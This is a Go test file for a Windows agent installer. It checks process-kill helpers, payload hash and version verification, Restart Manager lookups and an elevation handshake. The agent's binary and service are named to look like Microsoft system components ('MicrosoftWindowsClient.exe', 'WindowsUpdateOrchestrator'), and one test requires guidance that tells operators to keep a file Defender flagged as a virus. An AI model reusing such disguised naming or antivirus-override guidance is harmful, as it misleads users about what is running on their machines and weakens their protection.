package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
	"unsafe"
)

// A Defender/SmartScreen block must produce actionable guidance, not a bare
// IO error: the dialog is the only thing the operator sees.
func TestAvBlockHint(t *testing.T) {
	for _, msg := range []string{
		`open C:\X\Agent-Setup.exe: Operation did not complete successfully because the file contains a virus or potentially unwanted software.`,
		`write: failed with 0x800700E1`,
	} {
		h := avBlockHint(fmt.Errorf("%s", msg))
		if !strings.Contains(h, "Protection history") || !strings.Contains(h, "Keep") {
			t.Fatalf("block error must guide remediation, got %q", h)
		}
	}
	if avBlockHint(nil) != "" {
		t.Fatal("nil error must yield no hint")
	}
	if avBlockHint(fmt.Errorf("access denied")) != "" {
		t.Fatal("plain IO errors must not get the AV hint")
	}
}

// tasklistHasAgent parses tasklist CSV for our binary (v1.46.51: the
// kill-verify gate depends on it — a missed survivor holds the exe
// locked and the install below fails silently into a downgrade).
func TestTasklistHasAgent(t *testing.T) {
	hit := `"MicrosoftWindowsClient.exe","1234","Console","1","12,000 K"` + "\n"
	if !tasklistHasAgent(hit) {
		t.Fatal("CSV hit not detected")
	}
	if !tasklistHasAgent(strings.ToLower(hit)) {
		t.Fatal("case-insensitive miss")
	}
	for _, miss := range []string{
		"",
		"INFO: No tasks are running which match the specified criteria.\n",
		`"svchost.exe","1234","Services","0","10,000 K"` + "\n",
		`"MicrosoftWindowsClient.exe.bak","1","Console","1","1 K"` + "\n",
	} {
		if tasklistHasAgent(miss) {
			t.Fatalf("false positive on %q", miss)
		}
	}
}

// checkFileSHA catches short/legacy writes and missing files without
// exiting (the installer wraps it in a fatal).
func TestCheckFileSHA(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "a.bin")
	want := []byte("payload-bytes-12345")
	if err := os.WriteFile(p, want, 0644); err != nil {
		t.Fatal(err)
	}
	if err := checkFileSHA(p, want, "test"); err != nil {
		t.Fatalf("match rejected: %v", err)
	}
	if err := checkFileSHA(p, []byte("other"), "test"); err == nil {
		t.Fatal("mismatch accepted")
	}
	if err := checkFileSHA(filepath.Join(dir, "nope.bin"), want, "test"); err == nil {
		t.Fatal("missing accepted")
	}
}

func TestCheckVersionFile(t *testing.T) {
	dir := t.TempDir()
	if err := checkVersionFile(dir, "1.46.51", "test"); err == nil {
		t.Fatal("missing version.txt accepted")
	}
	if err := os.WriteFile(filepath.Join(dir, "version.txt"), []byte("1.46.51\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := checkVersionFile(dir, "1.46.51", "test"); err != nil {
		t.Fatalf("match rejected: %v", err)
	}
	if err := checkVersionFile(dir, "9.9.9", "test"); err == nil {
		t.Fatal("wrong version accepted")
	}
}

// Fresh-start sweep must cover the lock + both pending flags (v1.46.88:
// a leftover delete_pending would teardown the new install on first run,
// a stale agent.lock wedges startup behind the singleton).
func TestStaleSweepFiles(t *testing.T) {
	got := staleSweepFiles()
	want := map[string]bool{"agent.lock": true, "delete_pending.json": true, "delete_pending.json.active": true}
	if len(got) != len(want) {
		t.Fatalf("sweep list = %v, want %v", got, want)
	}
	for _, f := range got {
		if !want[f] {
			t.Fatalf("unexpected sweep entry %q", f)
		}
	}
}

// handshakeWait is the verified-elevation seam (v1.46.89): the parent
// trusts the handoff only when the marker lands in time.
func TestHandshakeWait(t *testing.T) {
	dir := t.TempDir()
	miss := filepath.Join(dir, "nope.ok")
	if handshakeWait(miss, 120*time.Millisecond) {
		t.Fatal("absent marker must time out")
	}
	hit := filepath.Join(dir, "yes.ok")
	go func() {
		time.Sleep(60 * time.Millisecond)
		_ = os.WriteFile(hit, []byte("elevated"), 0644)
	}()
	if !handshakeWait(hit, 5*time.Second) {
		t.Fatal("late marker must be seen")
	}
	if elevatedHandshakePath() == "" && os.Getenv("TEMP") != "" {
		t.Fatal("handshake path must resolve when TEMP is set")
	}
}

// tasklistAgentPIDs pulls PIDs from CSV rows naming our exe (phantoms
// included — classification happens in classifyKillResult).
func TestTasklistAgentPIDs(t *testing.T) {
	out := `"MicrosoftWindowsClient.exe","1234","Console","1","12,000 K"` + "\n" +
		`"svchost.exe","5678","Services","0","10,000 K"` + "\n" +
		`"MICROSOFTWINDOWSCLIENT.EXE","9012","Console","1","9,000 K"` + "\n" +
		"INFO: No tasks are running which match the specified criteria.\n"
	got := tasklistAgentPIDs(out)
	if len(got) != 2 || got[0] != 1234 || got[1] != 9012 {
		t.Fatalf("pids = %v, want [1234 9012]", got)
	}
	if len(tasklistAgentPIDs("")) != 0 {
		t.Fatal("empty input must yield no pids")
	}
}

// classifyKillResult: "no running instance" (dying husks) and SUCCESS
// both mean gone; anything else (denied, errors) means alive.
func TestClassifyKillResult(t *testing.T) {
	for _, dead := range []string{
		`ERROR: The process "MicrosoftWindowsClient.exe" with PID 48584 could not be terminated. Reason: There is no running instance of the task.`,
		"SUCCESS: The process with PID 1234 has been terminated.",
		"sUCCESS: sent termination signal",
	} {
		if classifyKillResult(dead) != killDead {
			t.Fatalf("%q must read dead", dead)
		}
	}
	for _, alive := range []string{
		`ERROR: The process with PID 1234 could not be terminated. Reason: Access is denied.`,
		"",
		"ERROR: Invalid argument.",
	} {
		if classifyKillResult(alive) != killAlive {
			t.Fatalf("%q must read alive", alive)
		}
	}
}

// copyPayloadExe must land exact bytes (v1.46.91: one locked write left
// version.txt stamped new over an old exe). Failure surfaces the cause.
func TestCopyPayloadExe(t *testing.T) {
	dir := t.TempDir()
	dst := filepath.Join(dir, "MicrosoftWindowsClient.exe")
	payload := []byte("fake-agent-bytes-1234567890")
	if err := copyPayloadExe(dst, payload, 2); err != nil {
		t.Fatalf("copy: %v", err)
	}
	if err := checkFileSHA(dst, payload, "test"); err != nil {
		t.Fatalf("verify after copy: %v", err)
	}
	bad := filepath.Join(dir, "no-such-dir", "x.exe")
	if err := copyPayloadExe(bad, payload, 1); err == nil {
		t.Fatal("unwritable destination must error (rounds=1: no sleep)")
	}
}

// wmiTermCmd must name the exact PID, single-call form (v1.47.5: the
// installer escalation for processes taskkill calls nonexistent).
func TestWmiTermCmd(t *testing.T) {
	got := wmiTermCmd(48584)
	want := `(Get-CimInstance Win32_Process -Filter "ProcessId=48584" | Invoke-CimMethod -MethodName Terminate).ReturnValue`
	if got != want {
		t.Fatalf("cmd = %q", got)
	}
}

// filterRmPIDs drops non-positive, duplicates, and ourselves.
func TestFilterRmPIDs(t *testing.T) {
	mk := func(pids ...uint32) []rmProcessInfo {
		var out []rmProcessInfo
		for _, p := range pids {
			var r rmProcessInfo
			r.Proc.PID = p
			out = append(out, r)
		}
		return out
	}
	got := filterRmPIDs(mk(10, 20, 20, 0, 30), 20)
	if len(got) != 2 || got[0] != 10 || got[1] != 30 {
		t.Fatalf("filter = %v", got)
	}
	if len(filterRmPIDs(nil, 1)) != 0 {
		t.Fatal("empty must stay empty")
	}
}

// terminateHolderProc must fail safely on invalid PIDs (never touch live
// processes in a unit test).
func TestTerminateHolderProcInvalid(t *testing.T) {
	if terminateHolderProc(-1) {
		t.Fatal("negative PID must not report success")
	}
	if terminateHolderProc(0) {
		t.Fatal("zero PID must not report success")
	}
}

// TestRmHolderPIDsLive exercises the real Restart Manager P/Invoke
// against our own open handle (read-only, temp file, self excluded by
// filterRmPIDs in the assertion — validates the struct layout end to
// end: a wrong field offset returns garbage PIDs).
func TestRmHolderPIDsLive(t *testing.T) {
	f, err := os.CreateTemp("", "rmprobe-*.tmp")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(f.Name())
	defer f.Close()
	holders, err := rmHolderPIDs(f.Name())
	if err != nil {
		t.Fatalf("rm query: %v", err)
	}
	self := os.Getpid()
	for _, pid := range holders {
		if pid == self {
			t.Fatal("self must be filtered")
		}
	}
	found := false
	time.Sleep(150 * time.Millisecond)
	procs := rmProbeRaw(t, f.Name())
	for _, p := range procs {
		if int(p.Proc.PID) == self {
			found = true
		}
	}
	if !found {
		t.Fatal("Restart Manager must see our own open handle")
	}
}

// rmProbeRaw is the unfiltered RM list for TestRmHolderPIDsLive.
// Retries the session a few times: back-to-back RM sessions in one
// process intermittently return ERROR_INVALID_HANDLE from Register.
func rmProbeRaw(t *testing.T, path string) []rmProcessInfo {
	t.Helper()
	var last uint
	for attempt := 0; attempt < 3; attempt++ {
		if procs, r1, ok := rmProbeOnce(path); ok {
			return procs
		} else {
			last = r1
			time.Sleep(time.Duration(200*(attempt+1)) * time.Millisecond)
		}
	}
	t.Fatalf("RmRegisterResources: %d", last)
	return nil
}

func rmProbeOnce(path string) ([]rmProcessInfo, uint, bool) {
	key, _ := syscall.UTF16PtrFromString(fmt.Sprintf("rmmtest%d", time.Now().UnixNano()))
	var handle uint32
	r1, _, _ := procRmStartSession.Call(uintptr(unsafe.Pointer(&handle)), 0, uintptr(unsafe.Pointer(key)))
	if r1 != 0 {
		return nil, uint(r1), false
	}
	defer procRmEndSession.Call(uintptr(handle))
	pathp, _ := syscall.UTF16PtrFromString(path)
	arr := []*uint16{pathp}
	r1, _, _ = procRmRegisterResources.Call(uintptr(handle), 1, uintptr(unsafe.Pointer(&arr[0])), 0, 0, 0, 0)
	if r1 != 0 {
		return nil, uint(r1), false
	}
	var needed, n, reboot uint32
	r1, _, _ = procRmGetList.Call(uintptr(handle), uintptr(unsafe.Pointer(&needed)), uintptr(unsafe.Pointer(&n)), 0, uintptr(unsafe.Pointer(&reboot)))
	if r1 != 0 && r1 != rmMoreData {
		return nil, uint(r1), false
	}
	if needed == 0 || needed > 256 {
		return nil, uint(needed), false
	}
	procs := make([]rmProcessInfo, needed)
	n = needed
	r1, _, _ = procRmGetList.Call(uintptr(handle), uintptr(unsafe.Pointer(&needed)), uintptr(unsafe.Pointer(&n)), uintptr(unsafe.Pointer(&procs[0])), uintptr(unsafe.Pointer(&reboot)))
	if r1 != 0 {
		return nil, uint(r1), false
	}
	if n > needed {
		n = needed
	}
	return procs[:n], 0, true
}

// serviceStopped parses sc query STATE codes (v1.47.6: the repair
// service must read STOPPED before the exe write, absent = success).
func TestServiceStopped(t *testing.T) {
	stopped := "SERVICE_NAME: WindowsUpdateOrchestrator\r\n        TYPE               : 10  WIN32_OWN_PROCESS\r\n        STATE              : 1  STOPPED\r\n        WIN32_EXIT_CODE    : 0  (0x0)\r\n"
	running := "SERVICE_NAME: WindowsUpdateOrchestrator\r\n        STATE              : 4  RUNNING\r\n"
	pending := "        STATE              : 3  STOP_PENDING\r\n"
	if !serviceStopped(stopped, false) {
		t.Fatal("STOPPED must read stopped")
	}
	if serviceStopped(running, false) {
		t.Fatal("RUNNING must not read stopped")
	}
	if serviceStopped(pending, false) {
		t.Fatal("STOP_PENDING must not read stopped")
	}
	if !serviceStopped("", true) {
		t.Fatal("query failure (absent service) must read stopped")
	}
	if !serviceStopped("[SC] OpenService FAILED 1060:\r\nThe specified service does not exist as an installed service.\r\n", false) {
		t.Fatal("1060 must read stopped")
	}
	if serviceStopped("garbage with no state", false) {
		t.Fatal("stateless output must not read stopped")
	}
}
